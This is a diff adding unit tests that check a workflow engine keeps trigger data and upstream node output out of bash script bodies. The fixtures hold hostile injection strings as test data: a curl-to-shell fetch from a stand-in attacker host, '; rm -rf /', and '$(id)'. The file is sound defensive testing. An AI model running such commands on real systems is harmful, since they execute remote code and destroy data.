@@ -880,4 +880,80 @@ describe("interpolateNodeConfig — script node", () => {
 
     expect((value as { template: string }).template).toBe("hi world");
   });
+
+  // A declared `inputs` alias is resolved by buildNodeInterpolationCtx BEFORE
+  // interpolateNodeConfig runs, so excluding only the literal `trigger` key
+  // left this path open (Reviewer finding on PR #1112).
+  test("an inputs alias POINTING AT trigger data is excluded from the script body", () => {
+    const node = {
+      type: "script",
+      inputs: { payload: "trigger.payload" },
+      config: { runtime: "bash", script: "echo {{payload}}" },
+    };
+    // The ctx buildNodeInterpolationCtx would produce for that node.
+    const ctx = {
+      trigger: { payload: "$(curl attacker.example/x | sh)" },
+      payload: "$(curl attacker.example/x | sh)",
+    };
+
+    const { value, unresolved } = interpolateNodeConfig(node, ctx);
+
+    const script = (value as { script: string }).script;
+    expect(script).not.toContain("curl attacker.example");
+    expect(script).toBe("echo ");
+    expect(unresolved).toContain("payload");
+  });
+
+  test("an alias that SHADOWS a builtin name but points at trigger data is excluded", () => {
+    const node = {
+      type: "script",
+      inputs: { input: "trigger.body" },
+      config: { runtime: "bash", script: "echo {{input}}" },
+    };
+    const ctx = { trigger: { body: "; rm -rf /" }, input: "; rm -rf /" };
+
+    const { value } = interpolateNodeConfig(node, ctx);
+
+    expect((value as { script: string }).script).toBe("echo ");
+  });
+
+  test("an inputs alias pointing at workflow input is still interpolated into the script", () => {
+    const node = {
+      type: "script",
+      inputs: { token: "input.API_TOKEN" },
+      config: { runtime: "bash", script: "curl -H 'Authorization: {{token}}' https://x" },
+    };
+    const ctx = { input: { API_TOKEN: "tok-123" }, token: "tok-123" };
+
+    const { value, unresolved } = interpolateNodeConfig(node, ctx);
+
+    expect((value as { script: string }).script).toBe("curl -H 'Authorization: tok-123' https://x");
+    expect(unresolved).toEqual([]);
+  });
+
+  test("upstream node output is excluded from the script body (LLM/script-generated text)", () => {
+    const node = {
+      type: "script",
+      config: { runtime: "bash", script: "echo {{fetchStep.stdout}}" },
+    };
+    const ctx = { fetchStep: { stdout: "$(id)" } };
+
+    const { value, unresolved } = interpolateNodeConfig(node, ctx);
+
+    expect((value as { script: string }).script).toBe("echo ");
+    expect(unresolved).toContain("fetchStep.stdout");
+  });
+
+  test("an inputs alias pointing at an upstream node output is excluded too", () => {
+    const node = {
+      type: "script",
+      inputs: { prev: "fetchStep.stdout" },
+      config: { runtime: "bash", script: "echo {{prev}}" },
+    };
+    const ctx = { fetchStep: { stdout: "$(id)" }, prev: "$(id)" };
+
+    const { value } = interpolateNodeConfig(node, ctx);
+
+    expect((value as { script: string }).script).toBe("echo ");
+  });
 });
